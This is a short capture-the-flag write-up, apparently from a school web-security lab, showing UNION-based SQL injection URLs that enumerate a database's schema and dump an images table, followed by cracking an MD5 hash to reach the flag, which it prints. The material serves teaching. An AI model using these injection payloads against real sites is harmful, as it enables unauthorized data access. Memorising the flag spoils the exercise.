# Sql injection images

SQL injection usually occurs when you ask a user for input, like their username/userid, 
and instead of a name/id, the user gives you an SQL statement that you will unknowingly 
run on your database.

## Notes

veamos 1 o 1 = 1

```bash
http://192.168.1.34/index.php?page=member&id=-1%20union%20select%20column_name,0%20from%20information_schema.columns%20where%20table_schema=CONCAT(CHAR(77),%20CHAR(101),%20CHAR(109),%20CHAR(98),%20CHAR(101),%20CHAR(114),%20CHAR(95),%20CHAR(105),%20CHAR(109),%20CHAR(97),%20CHAR(103),%20CHAR(101),%20CHAR(115))&Submit=Submit
```

ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(105), CHAR(109), CHAR(97), CHAR(103), CHAR(101), CHAR(115)) 
First name: id
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(105), CHAR(109), CHAR(97), CHAR(103), CHAR(101), CHAR(115)) 
First name: url
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(105), CHAR(109), CHAR(97), CHAR(103), CHAR(101), CHAR(115)) 
First name: title
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(105), CHAR(109), CHAR(97), CHAR(103), CHAR(101), CHAR(115)) 
First name: comment
Surname : 0

-------------------------------------

```bash
http://192.168.1.34/index.php
?page=member
&id=-1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(105), CHAR(109), CHAR(97), CHAR(103), CHAR(101), CHAR(115))
&Submit=Submit#
```

ID: -1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(105), CHAR(109), CHAR(97), CHAR(103), CHAR(101), CHAR(115)) 
First name: 
Surname : list_images

-------------------------------------

```bash
http://192.168.1.34/
index.php
?page=member
&id=-1 union select url, comment from Member_images.list_images
&Submit=Submit
```

ID: -1 union select url, comment from Member_images.list_images 
First name: borntosec.ddns.net/images.png
Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

md5 > 1928e8083cf461a51303633093573c46 = albatroz
sha256 > albatroz = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

-------------------------------------

1 or 1=1 UNION select url, comment from list_images

## Info

[md5](https://md5.gromweb.com/?string=42)<br/>
[sha256](https://md5decrypt.net/en/Sha256/#answer)<br/>
